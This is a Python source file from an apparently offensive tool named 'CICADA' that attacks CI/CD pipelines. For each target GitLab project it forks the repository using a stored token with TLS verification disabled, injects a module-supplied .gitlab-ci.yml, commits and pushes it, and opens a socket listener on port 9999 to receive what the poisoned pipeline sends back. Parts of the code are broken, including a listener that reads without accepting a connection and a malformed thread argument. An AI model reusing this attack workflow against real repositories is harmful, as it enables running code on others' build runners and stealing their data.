from cmd import Cmd
import main
import gitlab
import imp
import os
import git
import socket
import thread
from shutil import copyfile
from git import Repo


class ModuleMenu(Cmd):
    prompt = ""    

    def __init__(self,moduleName, installPath):
        Cmd.__init__(self)
        self.server = gitlab.Gitlab(main.CUSTOM_GITLAB, private_token=main.GITLAB_TOKEN, api_version=4, ssl_verify=False)

        self.moduleName = moduleName
        self.installPath = installPath
        self.module = None
        self.forked = None
        self.prompt = "(CICADA) [" + main.color.RED + self.moduleName + main.color.END + "] >>> "
        # Create module object
        self.loadModule(self.moduleName)
        
    def loadModule(self, moduleToLoad):
        rootpath = self.installPath + "/modules/" + moduleToLoad 
        # print("Module path: ", rootpath)
        #Check if path exist
        if not os.path.isdir(rootpath):
            print("Path doesn't exist")
            return
        for root, dirs, files in os.walk(rootpath):
            # Extract the module file *.py
            for file in files:
                if file[-3:] == ".py":
                    self.module = imp.load_source(file, rootpath + "/" + file).Module()

    def do_back(self, args):
        "Exit the module"
        return True

    def do_exit(self, args):
        "Exit the module"
        return True

    def do_info(self, args):
        "Give info about module"
        self.module.info()

    def do_targets(self, args):
        "Lists of your targets"
        return True # TODO: FIX THIS
        # if len(main.Terminal.targets) == 0:
        #     print("No targets")
        # else:
        #     for target in main.Terminal.targets:
        #         print(target)


    def do_exploit(self, args):
        "Run the exploit"
        if self.module.type == "gitlab":
            self.gitlabAttack()
        else:
            self.githubAttack()
            

    def do_run(self, args):
        "Run the exploit"
        if self.module.type == "gitlab":
            self.gitlabAttack()
        else:
            self.githubAttack()


    def gitlabAttack(self):
        print(self.module.type)
        self.module.exploit(main.Terminal.targets)
        for target in main.Terminal.targets:
            splittarget = target.split("/")
            # search for project
            project = self.server.projects.get(target)
            projectId = project.get_id()
            # Attempt to fork, if forked, stop
            try:
                print("[+] Forking.......")
                self.forked = project.forks.create(projectId)
            except Exception:
                print("[!] " + target + " already forked")
                self.forked = self.server.projects.get(main.GITLAB_USERNAME + "/" + splittarget[1])

            # TODO download fork project :http_url_to_repo': 'http://gitlab.example.com/test/ci-test.git
            url = self.forked.__dict__.get('_attrs')['http_url_to_repo']
            print("RUL:", url)

            try:
                print("[+] Cloning......")
                git.Git(self.installPath + "/repo/").clone(url)
            except Exception:
                print("[!] Already cloned")
            # copyfile(src, dst)
            copyfile( self.installPath + "/modules/"+self.moduleName + "/.gitlab-ci.yml", self.installPath + "/repo/" + splittarget[1] + "/.gitlab-ci.yml")
            # TODO pull request
            # git.Git(self.installPath + "/repo/")
            repo = Repo(self.installPath + "/repo/" + splittarget[1])
            repo.git.add(".gitlab-ci.yml")

            repo.git.commit('-m', "Update gitlab-ci.yml")
            repo.git.push('origin', 'master')

            # Create a listerner
            print("[!] Waiting for results...")
            # Start local listerner
            # TODO: Give users the option to change port
            thread.start_new_thread(self.startListerner, (9999))

    def githubAttack(self):
        print("afa")

    def startListerner(self, port):
        # Find a better way for listerner
        # Make a python socket for this
        listener_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            listener_sock.bind(('0.0.0.0', port))
        except:
            print("Couldn't bind to that port. :(")

        listener_sock.listen(1)
        results = listener_sock.recv(1024).decode()
        print(results)
        # os.system("nc -lv " + port)